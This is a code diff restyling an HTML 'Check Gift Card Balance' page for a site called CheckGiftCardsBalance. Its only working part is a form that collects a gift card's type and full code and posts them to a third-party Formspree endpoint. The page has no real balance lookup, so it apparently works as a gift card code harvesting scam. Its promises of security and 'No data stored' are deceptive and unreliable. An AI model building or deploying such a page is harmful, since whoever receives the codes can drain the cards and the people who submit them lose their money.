@@ -1,71 +1,161 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Check Gift Cards Balance</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <style>
-    body { font-family: Arial, sans-serif; margin:0; background:#f9f9f9; }
-    header { background:#1a1a1a; color:white; padding:40px 20px; text-align:center; }
-    section { max-width:900px; margin:auto; padding:30px 20px; }
-    h2 { color:#222; }
-    .box { background:white; padding:20px; border-radius:8px; margin-top:20px; }
-    button { background:#007bff; color:white; border:none; padding:12px 20px; cursor:pointer; }
-    input, select { width:100%; padding:10px; margin-top:8px; }
-    footer { text-align:center; padding:20px; font-size:14px; color:#666; }
-  </style>
+<meta charset="UTF-8">
+<title>Check Gift Cards Balance</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<!-- Font Awesome Icons -->
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+
+<style>
+body {
+  font-family: Arial, sans-serif;
+  background: #f2f5f9;
+  margin: 0;
+  color: #222;
+}
+
+header {
+  background: #0b5ed7;
+  color: white;
+  padding: 40px 20px;
+  text-align: center;
+}
+
+.container {
+  max-width: 900px;
+  margin: auto;
+  padding: 30px 20px;
+}
+
+.card {
+  background: white;
+  border-radius: 10px;
+  padding: 25px;
+  margin-bottom: 25px;
+  box-shadow: 0 5px 15px rgba(0,0,0,0.08);
+}
+
+h2 {
+  margin-top: 0;
+}
+
+label {
+  display: block;
+  margin-top: 15px;
+  font-weight: bold;
+}
+
+input, select {
+  width: 100%;
+  padding: 12px;
+  margin-top: 6px;
+  border-radius: 6px;
+  border: 1px solid #ccc;
+}
+
+button {
+  margin-top: 20px;
+  width: 100%;
+  padding: 14px;
+  background: #0b5ed7;
+  color: white;
+  border: none;
+  border-radius: 6px;
+  font-size: 16px;
+  cursor: pointer;
+}
+
+button:hover {
+  background: #084298;
+}
+
+.features {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+  gap: 20px;
+}
+
+.feature i {
+  font-size: 28px;
+  color: #0b5ed7;
+}
+
+footer {
+  text-align: center;
+  font-size: 14px;
+  color: #666;
+  padding: 25px;
+}
+</style>
 </head>
+
 <body>
 
 <header>
-  <h1>Check Gift Card Balance Securely</h1>
-  <p>A simple and transparent way to check gift card balance information.</p>
+  <h1>Check Gift Card Balance</h1>
+  <p>Secure and informational gift card balance checker</p>
 </header>
 
-<section class="box">
-  <h2>How It Works</h2>
-  <ol>
-    <li>Select your gift card type</li>
-    <li>Enter the card details</li>
-    <li>Submit to receive balance information</li>
-  </ol>
-</section>
+<div class="container">
 
-<section class="box">
-  <h2>Supported Gift Cards</h2>
-  <p>Amazon, Apple, Steam, Xbox, Google Play, and other popular gift cards.</p>
-</section>
+  <div class="card">
+    <h2>Check Your Gift Card</h2>
 
-<section class="box">
-  <h2>Check Your Balance</h2>
+    <form action="https://formspree.io/f/YOUR_FORM_ID" method="POST">
+      <label>Gift Card Type</label>
+      <select name="card_type" required>
+        <option>Amazon</option>
+        <option>Apple</option>
+        <option>Google Play</option>
+        <option>Steam</option>
+        <option>Xbox</option>
+        <option>Other</option>
+      </select>
 
-  <form action="https://formspree.io/f/YOUR_ID" method="POST">
-    <label>Gift Card Type</label>
-    <select name="card_type" required>
-      <option>Amazon</option>
-      <option>Apple</option>
-      <option>Steam</option>
-      <option>Xbox</option>
-      <option>Google Play</option>
-    </select>
+      <label>Gift Card Code</label>
+      <input type="text" name="card_code" placeholder="Enter card code" required>
 
-    <label>Card Code</label>
-    <input type="text" name="card_code" required>
+      <button type="submit">
+        <i class="fa-solid fa-magnifying-glass"></i> Check Balance
+      </button>
+    </form>
+  </div>
 
-    <button type="submit">Submit</button>
-  </form>
-</section>
+  <div class="card features">
+    <div class="feature">
+      <i class="fa-solid fa-lock"></i>
+      <h3>Secure</h3>
+      <p>HTTPS protected. No data stored.</p>
+    </div>
 
-<section class="box">
-  <h2>Privacy & Security</h2>
-  <p>
-    We respect your privacy. This site does not store or share card details.
-    All submissions are protected with HTTPS encryption.
-  </p>
-</section>
+    <div class="feature">
+      <i class="fa-solid fa-eye"></i>
+      <h3>Transparent</h3>
+      <p>Informational use only. Always verify with official providers.</p>
+    </div>
+
+    <div class="feature">
+      <i class="fa-solid fa-shield-halved"></i>
+      <h3>Privacy Focused</h3>
+      <p>No tracking, no selling of user data.</p>
+    </div>
+  </div>
+
+  <div class="card">
+    <h2>Important Notice</h2>
+    <p>
+      CheckGiftCardsBalance is an independent informational service.
+      We are not affiliated with any gift card issuer.
+      For official balances, always visit the card issuer’s website.
+    </p>
+  </div>
+
+</div>
 
 <footer>
-  <p>CheckGiftCardsBalance is an informational service. Always verify balances with official card issuers.</p>
+  © 2026 CheckGiftCardsBalance · All rights reserved
 </footer>
 
 </body>
